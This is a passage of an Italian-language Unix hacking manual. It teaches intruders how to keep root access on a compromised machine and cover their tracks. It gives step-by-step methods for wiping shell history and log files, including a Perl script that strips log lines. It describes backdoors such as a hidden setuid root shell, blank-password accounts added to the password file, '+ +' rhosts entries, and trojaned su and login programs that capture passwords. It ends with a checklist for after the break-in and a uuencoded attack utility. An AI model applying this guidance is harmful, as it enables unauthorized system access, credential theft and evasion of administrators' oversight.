+bash# ls -l findhost
+-rwsr-sr-x   1 root     root       299296 Jan 29 05:59 findhost
+
+bash# touch -t 111312331995 findhost
+bash# ls -l findhost
+-rwsr-sr-x   1 root     root       299296 Nov 13  1995 findhost
+
+bash# ls -l m*
+-rwxr-xr-x   1 root     root        64400 Oct 31  1995 mail
+-rwxr-xr-x   1 root     root         7689 Nov  2  1995 mkdir
+-rwxr-xr-x   1 root     root         7001 Nov  2  1995 mknod
+-rwxr-xr-x   1 root     root        20272 Nov  1  1995 more
+-rwsr-xr-x   1 root     root        26192 Nov  1  1995 mount
+-rwxr-xr-x   1 root     root         8381 Oct 31  1995 mt
+-rwxr-xr-x   1 root     root        12753 Nov  2  1995 mv
+
+******----> Adesso sembra tuto ok e vediamo se ci fornisce l'accesso di root...
+	    Usciamo dal sistema...          
+
+bash# exit
+
+[jnsmith@ns .term]$ cd /bin
+[jnsmith@ns /bin]$ whoami
+jnsmith
+[jnsmith@ns /bin]$ findhost
+[jnsmith@ns /bin]# whoami
+root
+
+[jnsmith@ns /bin]# cd
+
+******----> cd {enter} ci fa ritornare nella home
+
+[jnsmith@ns jnsmith]# ls
+mail
+[jnsmith@ns jnsmith]# echo + +>test
+[jnsmith@ns jnsmith]# ls -l
+total 2
+drwx------   2 jnsmith   jnsmith       1024 Jan 11 22:47 mail
+-rw-rw-r--   1 root      root            4 Jan 29 06:11 test
+
+******----> Adesso abbiamo uid=0 e gid=0
+
+[jnsmith@ns jnsmith]# rm test
+
+******----> puliamo...
+
+[jnsmith@ns jnsmith]# w
+6:12am  up 18 days,  8:58,  0 users,  load average: 0.07, 0.02, 0.00
+User     tty       login@  idle   JCPU   PCPU  what
+
+******----> giusto per essere sicuri che siamo ancora soli...
+
+[jnsmith@ns jnsmith]# ls -al /tmp/.p*
+total 15692
+-rw-rw-r--   1 root     root          157 Jan 29 06:10 .pinttemp.000
+
+[jnsmith@ns jnsmith]# ls -al
+total 32
+drwxrwx---   5 jnsmith   jnsmith   1024 Jan 29 06:11 .
+drwxr-xr-x  33 root      users     1024 Jan 22 16:53 ..
+-rw-r-----   1 jnsmith   jnsmith   1126 Aug 23  1995 .Xdefaults
+lrwxrwxrwx   1 jnsmith   jnsmith      9 Jan  1 21:40 .bash_history -> /dev/null
+-rw-r--r--   1 root      jnsmith     24 Jan  1 03:12 .bash_logout
+-rw-r--r--   1 root      jnsmith    220 Jan  1 03:12 .bash_profile
+-rw-r--r--   1 root      jnsmith    124 Jan  1 03:12 .bashrc
+-rw-rw-r--   1 root      jnsmith   5433 Jan 11 22:47 .pinerc
+drwxrwxr-x   2 jnsmith   jnsmith   1024 Jan 29 06:22 .term
+drwxr-x---   2 jnsmith   jnsmith   1024 Feb 17  1996 .xfm
+drwx------   2 jnsmith   jnsmith   1024 Jan 11 22:47 mail
+[jnsmith@ns jnsmith]#
+
+******----> Assicurati di mettere questo sys link .bash_history in /dev/null
+	    in modo tale da non lasciarti dietro history...
+
+Ok scolleghiamoci...
+
+Ok c'e' un altro modo!!!!
+
+Se ricordi non devi MAI dimenticare che quando entri in un account devi
+digitare : unset HISTFILE
+
+Questo dira' al sistema di cancellare il tuo history quando ti scolleghi
+dal sistema. USALO, NON DIMENTICARLO !!!!!
+
+-------------------
+Sezione 6B
+messaggi e syslog
+-------------------
+Nella directory di log troverai un file chiamato 'messages' ed in ogni sistema
+e' differente. Assicurati di controllare nel file /etc/syslog.conf eventuali
+logging in macchine remote aggiunti. Se esistono vedrai una cosa del genere:
+
+*.*                                 @somehostname.xxx
+
+Oppure per vedere dove vanno a finire i file di log controlla il file
+/etc/syslog.conf.
+
+Ecco un esempio...
+
+bash# more syslog.conf
+# /etc/syslog.conf
+# For info about the format of this file, see "man syslog.conf" (the BSD man
+# page), and /usr/doc/sysklogd/README.linux.
+#
+# NOTE: YOU HAVE TO USE TABS HERE - NOT SPACES.
+# I don't know why.
+#
+
+*.=info;*.=notice                               /var/adm/messages
+*.=debug                                        /var/adm/debug
+*.warn                                          /var/adm/syslog
+*.warn                                          /root/.../syslog
+*.=crit;kern.none                               /var/adm/critical
+kern.info;kern.!err                             /var/adm/kernel-info
+mail.*;mail.!=info                              /root/.../mail
+mail,news.=info                                 /root/.../info
+mail.*;mail.!=info                              /var/adm/mail
+mail,news.=info                                 /var/adm/info
+*.alert                                         root,bob
+*.=info;*.=notice                               @quality.com
+*.=debug                                        @quality.com
+*.warn                                          @quality.com
+*.=crit;kern.none                               @quality.com
+kern.info;kern.!err                             @quality.com
+mail.*;mail.!=info                              @quality.com
+mail,news.=info                                 @quality.com
+
+Qui, alcuni dei logs sono in una directory nascosta in /root ed inoltre una 
+copia di ogni alert e warning sono stati spediti a quality.com.
+wtmp, utmp e lastlog sono ancora in questa macchina, quindi puoi stare 
+tranquillo, pero' assicurati di non usare mai 'su' in un sistema come questo.
+Inoltre nota che i messaggi di alert sono spediti in questo sistema a root 
+e bob.
+
+Inoltre prendi nota che syslog, mail, e info sono spediti a /var/adm.
+Ok, quindi devi andare in /var/adm o /var/log e:
+
+grep yourhost * |more
+grep your ip * |more
+ 
+vedrai che alcuni files hanno registrato la tua connessone, segnateli ed
+edita il file /etc/syslog.conf.
+
+Dopo che hai editato il file fai ripartire il syslogd. 
+Puoi farlo facendo ps -x
+
+$root> ps -x
+
+39  ?  S    1:29 /usr/sbin/syslogd
+
+trova il syslogd e annota l'id del processo (in questo caso 39) quindi:
+
+kill -HUP 39
+
+Questo fara' ripartire il processo e rendera' effettive le vostre modifiche.
+
+Tra le altre cose bisogna assicurarsi di fare un ls -l /etc/syslog.conf
+PRIMA di editarlo e ripristinare la data come era prima quando si ha finito.
+
+Questo e' un altro file da guardare:
+
+/etc/login.defs
+
+# Enable "syslog" logging of su activity - in addition to sulog file logging
+# SYSLOG_SG_ENAB does the same for newgrp and sg.
+#
+SYSLOG_SU_ENAB          yes
+SYSLOG_SG_ENAB          yes
+#
+# If defined, all su activity is logged to this file
+#
+SULOG_FILE      /home/users/bob/.list
+
+Nota che esiste un su log file in un file nascosto in una delle directory
+dell'amministratore.
+
+--------------
+Sezione 6C
+xferlog
+--------------
+
+L'xferlog puo' essere editato con il tuo text editor preferito, pico, joe, 
+vi ecc. Puoi quindi cercare i tuoi transfers e cancellare le linee e salvare
+poi il file.
+Potresti anche 'greppare' i files nella directory /usr/local/etc/httpd/log
+se hai usato web o phf sul sistema, per rimuovere le tue tracce
+
+grep (username or hostname) * |more
+
+Se hai bisogno di trovare i logs per httpd puoi fare un find - name 
+httpd.conf- stampare e vedere dove sono.
+
+Ci possono essere logs ftp differenti in alcune directory ftp o virtual ftp.
+Guarda i files in /etc/ftp* per trovare quale setup di ftp e' nel box.
+
+Ti ho mostrato come editare i log usando pico, joe o altri editor.
+C'e' un altro modo... Alle volte i logs possono essere molto grandi e gli editor
+non ce la fanno. Questo e' cio' che devi fare...
+
+Hai un file messages di 20 meg ...wow!
+
+Se vuoi eliminare le linee che hanno fudge.candy.com dal file devi fare:
+grep -v fudge.candy >messages.2
+rm messages
+mv messages2 messages
+
+quindi kill -HUP <process id for syslogd>
+
+-v significa che deve greppare qualsiasi cosa che non sia fudge.candy e 
+metterlo in messages.2. Controlla la dimensione del file dopo il grep per
+essere sicuri che non ci siano stati errori e fai ripartire syslogd
+
+Questo puo' essere fatto per altri log come xferlog, syslog, ecc.
+
+Questo e' un script in perl che fara' questo per te dalla linea di comando
+
+---------------------- inizio riptext.pl
+#!/usr/bin/perl
+#
+# RipText - Takes regular expression and filename argument from @ARGV. Any 
+#           lines MATCHING regular expression will *not* be printed to 
+#           STDOUT. 
+# 
+#
+
+die("\nUsage: riptext [regexp] {filename}\n\n") if (!defined($ARGV[0]));
+($regexp, $filename) = @ARGV[0,1];
+
+# Read in contents of file.
+$/ = undef;
+$contents="";
+if (!defined($filename)) {
+  # Use STDIN.
+  $contents = scalar <STDIN>;
+} else {
+  # Use FILE.
+  open(FILE, "<$filename") || die("-RipText- Cannot open $filename: $!\n");
+  $contents = scalar <FILE>;
+  close(FILE);
+}
+
+@contents = split(/\n/, $contents);
+
+# Strip file of matching lines.
+open(FILE, ">$filename") || die("-RipText- Cannot write $filename: $!\n");
+foreach (@contents) {
+  print FILE "$_\n" unless (/$regexp/i);
+}
+close(FILE);
+
+0;
+
+------------------------ fine di riptext.pl
+
+Ricorda di far ripartire syslogd dopo aver editato i file!!!!!!
+
+--------------
+Sezione 6D
+Il cron table
+--------------
+
+Assicurati di controllare i cron files di root e dell'amministratore, in questo
+sistema abbiamo trovato un root cron file in: /var/spool/cron/crontabs
+bash# ls -l
+total 1
+-rw-------   1 root     root          851 Jan 26 14:14 root
+
+bash$ more root
+# This updates the database for 'locate' every day:
+40 07 * * *       updatedb 1> /dev/null 2> /dev/null
+40 */12 * * *       /sbin/checkfs
+
+
+C'e' un file che gira in /sbin chiamato checkfs.
+
+bash$ cd /sbin
+bash$ /sbin # more checkfs
+#!/bin/bash
+
+if [ ! -f /etc/default/fs/.check ]; then
+  echo WARNING!! Filecheck default file cannot be found. Please regenerate.
+    exit
+    fi
+
+md5sum /usr/bin/* > /tmp/filecheck 2>/dev/null
+md5sum /usr/sbin/* >> /tmp/filecheck 2>/dev/null
+md5sum /sbin/* >> /tmp/filecheck 2>/dev/null
+md5sum /bin/* >> /tmp/filecheck 2>/dev/null
+md5sum /usr/local/bin/* >> /tmp/filecheck 2>/dev/null
+md5sum /usr/local/sbin/* >> /tmp/filecheck 2>/dev/null
+md5sum /lib/* >> /tmp/filecheck 2>/dev/null
+md5sum /usr/lib/* >> /tmp/filecheck 2>/dev/null
+diff /tmp/filecheck /etc/default/fs/.check > /tmp/filecheck2 2>&1
+
+if [ -s /tmp/filecheck2 ]; then
+  mail -s FSCheck bin < /tmp/filecheck2
+  fi
+
+rm /tmp/filecheck /tmp/filecheck2 2>/dev/null
+
+md5 e' un checksum file. Se cambi o aggiungi un file in una delle directory
+sopraindicate, il cambiamento viene maillato all'amministratore!!!
+
+
+----------------------------------------
+Capitolo 7
+Ottenere l'accesso alla macchina
+----------------------------------------
+Ci sono molti modi per ottenere l'accesso ad una macchina.All'inizio perderai 
+l'accesso cosi' velocemente come stai imparando, ma spero che questo 
+manuale ed un po' di esperienza ti facciano diventare un buon hacker.
+
+--------------------
+Sezione 7a
+Trucchi e segreti
+--------------------
+
+Ci sono alcuni trucchi che ti permetteranno di ottenere accesso alla macchina.
+Dopo che un amministratore ti ha beccato, egli controllera' tutto il sistema.
+Egli ricompilera' i file di sistema, cambiera' le password a tutti i suoi 
+utenti,vietera' l'accesso da parte del tuo host alla sua macchina, controllera' 
+i file delle password ecc...
+
+Quando vedi che sei stato scoperto, non provare ad entrare di nuovo in quel 
+sistema. Ho visto persone che nonostante fossero stati scoperti, cercavano
+di utilizzare i loro exploits, le loro backdoor e account. Tu sei controllato
+ed e' molto piu' facile che ti becchino.
+
+NO! ANZI UN MOMENTO! Lascagli qualche mese, loro pensreanno che e' tutto ok 
+e si rilasseranno. cosi' tu potrai rientrare utilizzando una delle backdoors 
+che si sono dimnticati di cancellare.
+
+Ok e' arrivato il momento di dare qualche trucco...
+
+History Files
+-------------
+Metti sempre il tuo .bash_history in /dev/null, se sei sicuro che non devi 
+editarlo. Ricorda che .bash_history avra' sempre il tuo ultimo comando prima
+del logoff. Quindi se tu lo editi, esso mostrera' che lo stavi editando. 
+Potresti provare a cambiare la tua shell ed editarlo li' ma e' un casino, e'
+meglio settarlo a /dev/null
+
+1. Cancella il file nella directory dell'utente .bash_history se c'e'
+2. Digita il comando nella home directory: ln -s /dev/null .bash_history
+
+Directory nidificate:
+---------------------
+Trova sempre una directory nel sistema per nascondere i tuoi file. Ce ne sono
+alcune nelle quali gli utenti non guardano mai.
+
+Nella home directory dell'utente cerca .term, tutto cio' che troverai in questa
+directory e' un eseguibile chiamato termrc. Gli amministratori e gli utenti
+raramente guardano questa directory nascosta e non ci entrano MAI.
+Cosi' noi renderemo termrc un po' piu' grande, e gli aggiungeremo i permessi
+suid... hai capito l'idea? Spero tu abbia indovinato... vai nella directory /bin
+e digita : cp bash (o sh o la shell che c'e') ~username/.term/termrc
+poi digita : chown root ~username/.term/termrc
+           : chgrp root ~username/.term/termrc
+           : chmod +s ~username/.term/termrc
+
+Adesso hai un file nidificato che puo' darti l'accesso a root ogni volta che 
+vuoi e che e' difficile da individuare da parte dell'amministratore. Se poi vuoi
+fare il figo cambia la data pe far sembrare il file vecchio.
+
+Un altra directory nell'account dell'utente non usata potrebbe essere .elm, 
+.term o Mail, o prova a creare una directory chiamata '...', questa e' difficile
+da individuare, visto che le prime dir che vengono mostrate sono '.' e '..'.
+
+Questo e' quello che appare dopo un ls :
+1024 Jan 29 21:03 .
+1024 Dec 28 00:12 ..
+1024 Jan 29 21:03 ...
+ 509 Mar 02  1996 .bash_history
+  22 Feb 20  1996 .forward
+ 164 May 18  1996 .kermrc
+  34 Jun 06  1993 .less
+ 114 Nov 23  1993 .lessrc
+1024 May 18  1996 .term
+1024 May 19  1996 public_html
+se per
+ viene digitato un ls -l, questo e' quello che si vede:
+
+1024 May 19  1996 public_html
+
+Ricorda che puoi sempre cercare qualche REAL LONG file path dove sei sicuro
+che nessuno entra mai, ed usarlo per le directory nidificate. Puoi sempre
+creare la tua directory (...) ;)
+
+
+Creare nuovi comandi
+--------------------
+Dopo aver controllato il cron per vedere se si sta usando md5, puoi anche
+copiare uno dei tuoi exploits in un altro filename nel sistema o solamente 
+sovrascrivere un comando che sai che non asara' mai usato. Se copi un file in 
+un altro con un altro nome assicurati di controllare la data del file. 
+Il tutto non e' molto duraturo perche' prima o poi la versione sara' patchata e 
+l'exploit non funzionera' piu'.
+
+E' meglio usare una shell con un nuovo nome e quindi farla suid.
+
+
+Aggiungere o cambiare la lista delle password
+---------------------------------------------
+Un'altra backdoor che puoi usare e' aggiungere un nuovo utente nel file delle
+password. Pero' bisogna farlo con prudenza.
+Non usare mai la password che hai aggiunto, non loggarti mai, e' solo per backup
+in caso tu perda l'accesso.
+
+Ci sono varie scuole di pensiero: una dice che non devi mai aggiungere un root
+account che e' come dire "Guardate sto hackando il vostro sistema!!".
+un modo per farlo e':
+
+root:fVi3YqWnkd4rY:0:0:root:/root:/bin/bash
+sysop:mZjb4XjnJT1Ys:582:200:System Operator:/home/sysop:/bin/bash
+bin:*:1:1:bin:/bin:
+daemon:*:2:2:daemon:/sbin:
+adm:*:3:4:adm:/var/adm:
+lp:*:4:7:lp:/var/spool/lpd:
+sync:*:5:0:sync:/sbin:/bin/sync
+shutdown:*:6:0:shutdown:/sbin:/sbin/shutdown
+halt:*:7:0:halt:/sbin:/sbin/halt
+mail:*:8:12:mail:/var/spool/mail:
+news:*:9:13:news:/usr/lib/news:
+uucp:*:10:14:uucp:/var/spool/uucppublic:
+operator:*:11:0:operator:/root:/bin/bash
+games:*:12:100:games:/usr/games:
+man:*:13:15:man:/usr/man:
+postmaster:*:14:12:postmaster:/var/spool/mail:/bin/bash
+nobody:*:65535:100:nobody:/dev/null:
+ftp:*:404:1::/home/ftp:/bin/bash
+
+Ecco le cose che si possono fare con questo passwd:
+
+1. Guarda le linee con operator, ftp e postmaster. Tutti questi account hanno
+shell senza password. Dalla tua shell digita:
+
+passwd postmaster
+
+Setta l'account senza inserire la password semplicemente premendo enter. Adesso
+sei in grado di entrare con questo account ogni volta che vuoi senza una 
+password
+ed il file passwd rimarra' invariato senza destare sospetti.
+
+2. Aggiungi questa linea al file delle password:
+
+syst::13:12:system:/var/spool:/bin/bash
+
+Puoi lasciare i :: o inserire una password che vuoi digitando dalla root shell
+passwd syst. Metti il GID e l' UID che vuoi.
+
+3. Osserva la linea sotto:
+
+sync:*:5:0:sync:/sbin:/bin/sync
+
+Cambiala in:
+
+sync:*:5:0:sync:/sbin:/bin/bash
+
+e quindi lancia <passwd sync> lasciando la password vuota. (o settala, non 
+importa) Su questo account noi siamo sempre GID=0 <G>rin
+
+
+Essere sempre in agguato
+------------------------
+Sapere sempre chi e' l'amministratore di sistema; puoi trovarlo guardando il
+file delle password (/etc/passwd in genere). Devi vedere la sua home, il suo 
+uid, i group access account, e leggere SEMPRE tutti i file di bush_history 
+nell'user directory per vedere chi sta usando i comandi da amministratore.
+Puoi cosi' conoscere molti comandi nuovi dalla lettura degli history, ma tu
+devi anche sapere chi c'e' nel sistema. Devi conoscere bene il tuo sistema.
+Cerca gli utenti usando su: Guarda i log file per vedere chi sta usando i
+comandi da amministratore.
+
+Tieni sempre sotto controllo il sistema, tieni traccia di chi e' presente nel 
+sistema mentre sei dentro anche tu. Guarda l'history dell'admin per vedere
+che comandi esegue: ttysnoops? Troppi comandi ps, w o who dimostrano che stanno
+controllando cosa stanno facendo altri utenti nel sistema.
+
+
+Leggere le mail di sistema
+--------------------------
+Ricorda di non usare MAI programmi di mail di sistema! Essi sono in grado di
+dire che tu stai leggendo le loro mail. Io uso un insieme di accorgimenti:
+
+1. cd /var/spool/mail
+cosi' entrerai nella directory che contiene tutte le mail non lette. Adesso 
+puoi fare una cosa del genere:
+
+grep -i security * |more
+grep -i hack * |more
+grep -i intruder * |more
+grep -i passwd * |more
+grep -i password * |more
+
+
+Puoi anche cancellare messaggi se vedi che qualche altro amministratore dice 
+che qualcuno nel sistema dove sei sta hackando la sua macchina. Eh, la spia
+non si fa ;).
+
+Per trovare un mail reader che ti permette di leggere mail senza aggiornare i
+puntatori, prova a:
+
+http://obsidian.cse.fau.edu/~fc
+
+Qui ci sono utility ceh riescono a fare il cat /var/spool/mail senza cambiare
+la data dell'ultima lettura.
+
+Ricorda inoltre che puoi trovare altre system mail nelle directory degli utenti
+Assicurati di guardare nella directory /root. Guarda in /root/mail o 
+username/mail o in altre directory che contengono mail vecchie.
+
+Buona caccia...
+
+------------
+Sezione 7B
+Backdoors
+------------
+Creare una backdoors e' uno dei modi piu' semplici ed allo stesso modo piu' 
+sicuri
+per mantenere l'accesso come root ad un sistema. Oltre a quelle gia' viste 
+proponiamo alcune idee che potrete facilmente realizzare.
+
+Le backdoors forniscono due o tre funzion principali:
+
+1. "Garantisce" l'accesso al sistema ancche se l'amministratore tenta di 
+renderlo
+   piu' sicuro, per esempio cambiando tutte le password.
+2. "Garantisce" l'accesso alla macchina in modo meno visibile per 
+l'amministratore.
+   Alcune di esse possono renderti invisibile agli acchi di chi controlla il
+   sistema.
+3. Fornisce l'accesso alla macchina in modo molto piu' veloce rispetto a quando
+   si e' provato a exploittarla.
+
+Backdoors 1 : Cracking del file di password
+Uno dei metodi piu' antichi per guadagnare un accesso in un sistema. Di questo 
+ne abbiamo parlato approfonditamente nel capitolo 2.
+
+Backdoor 2 : Rhosts + +
+Nelle macchine Unix, alcuni servizi come Rsh e Rlogin usano un semplice metodo
+di identificazione basato sugli hostname che compaiono nel file .rhosts.
+L'amministratore puo' scegliere quali macchine non necessitano di password per
+collegarsi. Basta inserire nel file rhost la linea "+ +". In questo caso
+chiunque si colleghi in remoto con quella macchina lo fa senza inserire la
+password. Anche ogni utente possiede nella sua HOME un file .rhosts. Se si
+riesce a modificarlo aggiungendo "+ +" si puo' fare un rlogin a quell'utente
+ed entrare senza password!!
+ATTENZIONE che molti amministratori controllano la presenza dei due + in tutti
+gli .rhosts!!!!
+
+Backdoor 3 : Checksum e Timestamp
+Molti hackers rimpiazzano dei file di sistema con i propri cavalli di troia.
+Altrettanti amministratori, per scoprire questo si affidano a dei programmi
+che controllano il checksum e il time-stamp  come il famoso sum di UNIX.
+Come contromossa gli hacker hanno al loro volta costruito dei programmi che
+ricreano il time-stamp originale ai trojan. Tutto questo mandando indietro 
+l'orologio di sistema all'ora del fle originale  quindi modificando l'ora del 
+trojan all'ora di sistema. Una volta che il trojan ha l'ora dell'originale
+il clock di sistema viene ripristinato.
+Il programma sum si affida al controllo del CRC dei file ma spesso viene
+spoofes. Noi hacker abbiamo sviluppato dei programmi che modificano i trojan
+in modo da avere il checksum originale, facendo impazzire gli amministratori.
+MD5 checksum si basa su un algoritmo che nessuno fin'ora e' stato in grado di
+spoofare.
+
+Backdoor 4 : Login
+
+In UNIX il programma login e' quello che si occupa della identificazione e 
+controllo delle login e password quando ci si telnetta ad una macchina.
+Gli hacker ricompliano il file login.c in modo che le login + password inserite
+dagli utenti vengno loggate in un file in qualche directory. In questo modo
+l'hacker legge questo file ed ha tutte le login e pwd pronte in un piatto
+di argento. In questo modo ci si puo' loggare senza che l'amministratore noti
+qualcosa di strano. Molti adm trovano queste backdoor con MD5.
+
+Backdoor 5: Telnetd
+
+Quando un utente si telnetta ad una macchina, il servizio inetd che ascolta
+su quella porta riceve la connessione e la passa ad in.telnetd, esso esegue
+molti controlli sull'utente come il tipo di terminale che sta usando.
+Generalmente il terminale e' settato ad Xterm o VT100. L'hacker puo' fare in modo
+che, per esempio, quando il terminale e' settato ad "letmain" in.telnetd
+mandi una shell senza fare nessun controllo. Ovviamente per farlo e' necessario
+modificare l' in.telnetd. Questo e' solo un esempio, i servizi disponibili 
+sono molti e si possono inventare altrettante backdoor
+
+Backdoor 6: Librerie
+
+La maggior parte dei sistemi Unix usano delle librerie condivise. Queste 
+librerie vengono utilizzate da piu' programmi in modo da non appesantirne il
+codice di ogni singolo. Gli hackers modificano le routine come cript.c e 
+_crypt.c per avere dei vantaggi. Per esempio, programmi come login.c
+usano la routie crypt(); si puo' modificare il codice in modo che se si inserisce
+una certa password viene aperta una shell suid. cosi' anche se l'amministratore
+utilizza MD5 sul programma login non notera' niente di irregolare. Raramente
+gli adm controllano le librerie con MD5. Se dovesse capitare si puo' utilizzare
+una piccola scorciatoia. E' possibile modificare le librerie di accesso ai
+file come la open() in modo che venga letto il file originale ma venga
+eseguita la versione trojan. In questo modo quando MD5 controlla un file
+viene letto quello giusto ,cosi' il checksum e' corretto, ma viene eseguito
+il trojan. Divertente no? Le librerie stesse non vengono intercettate.
+Attenzione, pero', che alcuni adm compilano i programmi con link statici, in
+modo da non utilizzare le librerie codivise.
+
+Backdoor 7: File system
+
+Come sappiamo quando si entra in un sistema abbiamo bisogno di una serie
+di sniffer, log, exploit rootkit ecc. per continuare l'hacking. Ma qui
+masce un problema... Come nascondere questi programmi all' amministratore?
+Certo, perche' se li scopre... Quindi si puo' o modificare i comandi "ls", "du"
+e "fsck" per nascondere l'esistenza dei nostri tool, oppure e' possibile
+creare una sezione dell'hard disk marcata come bad sector. cosi' l'hacker
+puo' accedervi solo con tool speciali, ma per l'amministratore e' difficile
+individuare che sotto il marchio di bad sector si nasconde uno spazio 
+disponibile per noi...
+
+
+Backdoor 8: Nacondere i processi
+
+Un hacker, qualche volt, vuole nascondere i processi che fa giare. Generalmente
+sono password cracker o sniffer.
+Ci sono molti modi per farlo, per esempio:
+
+Si puo' rinominare il nostro programma col nome di un servizio del SO come 
+in.syslog.
+Quando l'amministratore digita un ps vedra' girare un programma standard.
+
+Si puo' modificare il programma ps in modo che non visualizzi i nostri prg.
+
+Si potrebbe anche modificare il kernel per evitare di far mostrare i nostri prg.
+
+Insomma ci sono molti modi per nasconderli, basta un po' di fantasia...
+
+
+--------------------------
+Sezione 7C
+Root & Demon Kit e Trojan
+--------------------------
+I Root Kits sono sorgenti C per ps, login, netstat ed altri programmi hackati
+per te. Con questi kit sarai in grado di cambiare i login file nell'hacked box 
+in modo da poterti loggare senza un account nella macchina.
+
+Sarai anche in grado di patchare il ps in modo da non essere individuato quando
+un amministratore usa il comando ps. Con il ps patchato puoi anche non far 
+mostrare  processi che hanno certi nomi, per esempio quelli che iniziano con
+'sniff';)
+
+ I demon kit hanno programmi hackati per identd, login demon, ping, su, telnetd 
+e socket.
+
+I Trojan sono tutti quei file che ti permettono di exploittare il sistema in
+qualceh modo. Un trojan 'su' messo nella directory dell'amministratore si
+eseguira' quando l'admin lo chiamera' per fare qualche operazione. Dopo che
+egli inserira' la sua password, il trojan 'su' gli comunichera' che la password
+inserita e' sbagliata e si autocancellera' dopo aver salvato la password nella
+directory /tmp. A questo punto l'admin credera' di aver sbagliato a digitare
+e riprovera'. Questa volta parte l'su vero e tutto procedera' normalmente.
+
+Un trojan di login, invece, salvera' tutte le login e password in un file per 
+te.
+
+ 
+********************************************
+* Appendice I -  Cosa fare dopo un accesso *
+********************************************
+
+Penso che in questo manuale abbiamo descritto la maggior parte delle cose che
+bisogna fare dopo un accesso, nonosatante ridescriviamo i passi in una lista
+dalla a alla z.
+
+a. trova chi sono gli amministratori del sistema
+b. analizza il sistema con ps -auxe e ps -auxef (se funziona) e pstree per 
+   vedere cosa stanno facendo gli altri utenti
+c. leggi tutti i file di bash history o tutti gli history file che riesci a
+   trovare sulla macchina per imparare di piu' sugli utenti.
+d. crea delle backdoors nel sistema in modo da non essere scoperto
+e. tieni l'accesso per te e non dare user password ad altre persone della 
+   macchina dove sei root.
+f. cancella sempre i tuoi utmp e wtmp quando ti connetti
+g. cancella sempre i tuoi messaggi inclusi i tuoi xferlog
+h. se hai l'accesso di root assicurati di lggere /etc/syslog.conf e 
+   /etc/login.defs  per vedere come il sistema e' loggato.
+i. prima di cambiare file controlla il root cron per vedere cosa sta girando
+j. cerca md5 sul sitsema
+k. cerca ftp logs separati
+l. assicurati di cancellare i www logs se hai spedito comandi phf al server
+m. crea una suid root shell e mettila da qualche parte nel sistema
+n. fai solo ci
+ che sei sicuro di saper fare
+o. usa solo directory nidificate, non mettere file in user directory dove
+   basta fare un ls per vederli
+p. non aggiungere user account e pensare che non ti scoprano
+q. non usare pine o altri mail program per leggere le mail degli utenti. Se
+   vuoi leggere le mail vai nella directory mail e leggile da qui, le mail
+   nuove le troverai in /var/spool/mail
+r. non cambiare il sistema in modo tale che altri programmi che girano non
+   funzionino piu'
+s. non cancellare file dal sistema a meno che non gli hai messi tu.
+t. non modificare le web page
+u. non cambiare alcuna password del sistema (a meno che lo stai facendo per 
+   accedere al sistema salvando il passwd e risostituendolo dopo che ti sei
+   collegato)  
+v. non usare il root account per accessi irc o per caricare un bot
+w. se il tuo root account cambia o crei file che sono propritari di un group
+   sbagliato, assicurati di eseguire il chown dei file
+x. non usare il .rhosts se ce n'e' gia' uno in uso
+y. non telnettare o usare ftp dall'hacked box
+z. non fottere la loro macchina! Fai cio' che sai fare. 
+
+****************************************************
+* Appendice II - Siti Hacking / Security www / ftp *
+****************************************************
+
+IRC QuantumG #virus
+Quantum's Linux Page
+http://obsidian.me.fau.edu/~quantum
+Buon sito per avere informazioni sugli exploits di unix
+
+CyberToast's Files section
+Qui troverai una buona sezione dedicata all H/C/P/V hex editors, scanners ecc.
+www.ilf.net/~toast/files
+
+Reptiles Realm
+Buon sito per i linux exploits
+www.users.interport.net/~reptile/linux
+
+Sito ftp su IRC, BOTS, UNIX EXPLOITS, VIRUSES e ZINES!
+http://ftp.giga.or.at/pub/hacker
+
+Linux Security Digest
+http://king.dom.de/~un/linux-security
+
+Linux Security Alert
+http://bach.cis.temple.edu/linux/linux-security/Linux-Alerts
+
+The Linux Security Home Page
+http://www.ecst.csuchico.edu/~jtmurphy
+
+Per trovare i siti basta fare una ricerca con Yahoo, Altavista e Astalavista
+(astalavista.box.sk) con chiave hacking, hack, crack ...
+
+
+**************************************
+* Appendice III - Files UUENCODATI   *
+**************************************
+
+1. Quantum's bindwarez utility uuencoded
+
+Bindwarez binary file da usare con la 'Quantum's PHF guide'per ottenere degli
+account (vedi sezione PHF in questo testo)
+
+begin 664 binwarez.zip
+M4$L#!!0````(`'>"0B)K$\T.%CD``.QW```)`!``8FEN9'=A<F5Z55@,`"GG
+M]C("$_4R`````.U]>UQ41]+HF6$&!QP<5#1H4$<C$9.(X"MB-,IC$#8((\-#
+MHX8@C!X(`@MG?.2*8@82QLF8B4DV^7:3K*S9;]W-8]W=:$A,%!\!\]B$&'?C
+M%]TLV9CD3,9DW3P0$9E;5=UG9D#-XOV^W^_>/R[\ZO2I[NKNZNKJZNH^/>=L
+M-66EJU0J0?E3"R$"88]I=+,@>$YB\;,$HZ`5XH110I002CA`/=``[()[!"V`
+M!B`$X"0"I"&,A/N1/$W%@?X@#2'L/D%`P/Q")$N/!#SRDD:'T`$5[IHL4+V8
+MKH;`_%,`E5:'X`8<(937,;VB;/7TBM)I%665MHWQM57QB<+Z5(B_FU>[@(>W
+M`.0`+`;(`I@&,!,@%Z`0(!S@)H";`3#_(IYO*<!"?K\$(`W@=H!8@!$`>0`Z
+M@-LXS7*`N_A]&,!D?J_G80CG>RC`?&P;C[\3P``0`Y``,(_'+P-(![``3`+(
+M!I@-4``P7`C\H<R',)$)TWG<,(`)`I?UC_S=&'2/\H[B]S."XL<"F`"2`>;^
+MF_)^[&_,5>)">7C#@/C1`+<"3!D0/Y6'<5<I*Q$@'F`.Q\?S\`Z`<0`10;0I
+M/$0=C.;WLWB8-*#<G_!P%$`^@!%@(H_+Y&'&5?C!/GIJAT:'?(S@]1P''-,F
+M<?Y0KQGMOWS8UNA'-+JUG![;$@=XA8;ABP#$1P+Y49]QW&@HOY[TM9Z7/P(T
+M`G5;=`?H5P'(@-_,R[<"=`/^)L?78?V/!NAMF#\(_U_8GB#\`8`]@'^J8OFW
+M(S__4.H/I[&Z;">S+YC^I(!C)=#>%R%L@O1ZGOXZE@?\;^0X\M4"^%2.OPUP
+M"O`X7O\'V![`Y_+TC[$]@-_$\<\`="`O&\?/`W2"O)F\A@L]$)[EN!%["]HA
+M`Y['T_6`SX7\6WC^$8!G!,E_#.#+@O#Q@&\$/$/%\,D0SE<'ZKL5\"9(WQO"
+MRDL"_"G`E_'\BS#]4XWN3JHO3%@,^!Z>CO39@+<$U9<'^/$@_&[`3P$^A]/?
+MB^T!?#5/MP+>#?B?>'HMX+H@_=@$>'00OA7P.'>`OP=1'H"G\_P[41[N0/\^
